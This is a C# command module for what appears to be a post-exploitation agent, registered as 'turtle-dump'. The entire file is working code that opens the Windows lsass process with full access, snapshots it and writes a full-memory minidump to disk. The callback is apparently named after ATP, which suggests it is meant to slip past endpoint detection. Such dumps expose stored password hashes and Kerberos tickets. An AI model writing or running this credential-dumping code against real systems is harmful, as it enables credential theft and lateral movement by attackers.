using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Agent.Models;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

namespace Agent.Commands
{
    class TurtleDump : AgentCommand
    {
        public override string Name => "turtle-dump";

        public override string Execute(AgentTask task)
        {
            var dumpPath = task.Args[0];
            if (!ExecuteTurtledump(dumpPath))
                return "Failed to perform lsass dump";
            return $"Wrote Dump to {dumpPath}";
        }

        public static bool ExecuteTurtledump(string path)
        {
            FileStream dumpFile = new FileStream(path, FileMode.Create);
            Process[] proc = Process.GetProcessesByName("lsass");
            int pid = proc[0].Id;
            IntPtr handle = Native.Kernel32.OpenProcess(0x001F0FFF, false, pid);
            IntPtr snapshotHandle;
            Native.Kernel32.PSS_CAPTURE_FLAGS snapFlags = Native.Kernel32.PSS_CAPTURE_FLAGS.PSS_CAPTURE_VA_CLONE
              | Native.Kernel32.PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLES
              | Native.Kernel32.PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLE_NAME_INFORMATION
              | Native.Kernel32.PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLE_BASIC_INFORMATION
              | Native.Kernel32.PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION
              | Native.Kernel32.PSS_CAPTURE_FLAGS.PSS_CAPTURE_HANDLE_TRACE
              | Native.Kernel32.PSS_CAPTURE_FLAGS.PSS_CAPTURE_THREADS
              | Native.Kernel32.PSS_CAPTURE_FLAGS.PSS_CAPTURE_THREAD_CONTEXT
              | Native.Kernel32.PSS_CAPTURE_FLAGS.PSS_CAPTURE_THREAD_CONTEXT_EXTENDED
              | Native.Kernel32.PSS_CAPTURE_FLAGS.PSS_CREATE_BREAKAWAY_OPTIONAL
              | Native.Kernel32.PSS_CAPTURE_FLAGS.PSS_CREATE_BREAKAWAY
              | Native.Kernel32.PSS_CAPTURE_FLAGS.PSS_CREATE_RELEASE_SECTION
              | Native.Kernel32.PSS_CAPTURE_FLAGS.PSS_CREATE_USE_VM_ALLOCATIONS;
            int hr = Native.Kernel32.PssCaptureSnapshot(handle, snapFlags, (int)Native.Kernel32.CONTEXT_FLAGS.CONTEXT_ALL, out snapshotHandle);
            Native.Kernel32.MINIDUMP_CALLBACK_INFORMATION callbackInfo = new Native.Kernel32.MINIDUMP_CALLBACK_INFORMATION();
            callbackInfo.CallbackParam = IntPtr.Zero;
            callbackInfo.CallbackRoutine = IntPtr.Zero;
            var callbackDelegate = new Native.Kernel32.MiniDumpCallback(Native.Kernel32.ATPDumpCallbackMethod);
            var callbackParam = Marshal.AllocHGlobal(IntPtr.Size * 2);
            unsafe
            {
                var ptr = (Native.Kernel32.MINIDUMP_CALLBACK_INFORMATION*)callbackParam;
                ptr->CallbackRoutine = Marshal.GetFunctionPointerForDelegate(callbackDelegate);
                ptr->CallbackParam = IntPtr.Zero;
            }
            int result = Native.Kernel32.MiniDumpWriteDump(snapshotHandle, pid, dumpFile.SafeFileHandle.DangerousGetHandle(), Native.Kernel32.MINIDUMP_TYPE.MiniDumpWithFullMemory, IntPtr.Zero, IntPtr.Zero, callbackParam);
            if (result == 0)
            {
                Console.WriteLine($"MiniDumpWriteDump failed. ({Marshal.GetHRForLastWin32Error()})");
                dumpFile.Close();
                return false;
            }
            dumpFile.Close();
            return true;
        }
    }
}
